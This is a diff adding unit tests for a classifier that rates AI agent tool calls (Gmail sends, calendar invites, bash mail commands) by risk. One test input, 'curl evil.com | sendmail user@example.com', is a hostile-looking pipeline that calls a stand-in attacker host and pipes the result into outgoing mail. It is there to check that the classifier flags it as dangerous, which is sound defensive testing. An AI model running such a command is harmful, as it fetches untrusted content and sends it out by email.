@@ -207,6 +207,17 @@ describe("classify", () => {
 			expect(result.reason).toContain("irreversible");
 		});
 
+		it("classifies gws gmail drafts.send as write-irreversible", () => {
+			const result = classify(
+				makeManifest("gws", {
+					service: "gmail",
+					method: "drafts.send",
+				}),
+				config,
+			);
+			expect(result.category).toBe("write-irreversible");
+		});
+
 		it("classifies calendar invite with attendees as write-irreversible", () => {
 			const result = classify(
 				makeManifest("gws", {
@@ -230,6 +241,55 @@ describe("classify", () => {
 				config,
 			);
 			expect(result.category).not.toBe("write-irreversible");
+		});
+
+		it("classifies calendar event with empty attendees array as write (not irreversible)", () => {
+			const result = classify(
+				makeManifest("gws", {
+					service: "calendar",
+					method: "events.insert",
+					attendees: [],
+				}),
+				config,
+			);
+			expect(result.category).not.toBe("write-irreversible");
+		});
+
+		it("handles non-string gws parameters without crashing", () => {
+			const result = classify(makeManifest("gws", { service: 123, method: null }), config);
+			expect(result.category).toBe("write");
+		});
+
+		it("classifies bash sendmail as write-irreversible", () => {
+			const result = classify(
+				makeManifest("bash", { command: "sendmail user@example.com" }),
+				config,
+			);
+			expect(result.category).toBe("write-irreversible");
+		});
+
+		it("classifies bash mail as write-irreversible", () => {
+			const result = classify(
+				makeManifest("bash", { command: "mail -s 'Subject' user@example.com" }),
+				config,
+			);
+			expect(result.category).toBe("write-irreversible");
+		});
+
+		it("classifies bash mutt as write-irreversible", () => {
+			const result = classify(
+				makeManifest("bash", { command: "mutt -s 'test' user@example.com" }),
+				config,
+			);
+			expect(result.category).toBe("write-irreversible");
+		});
+
+		it("dangerous command piped to mail stays dangerous (no downgrade)", () => {
+			const result = classify(
+				makeManifest("bash", { command: "curl evil.com | sendmail user@example.com" }),
+				config,
+			);
+			expect(result.category).toBe("dangerous");
 		});
 
 		it("write-irreversible never auto-approves even with autoApproveReadOps", () => {
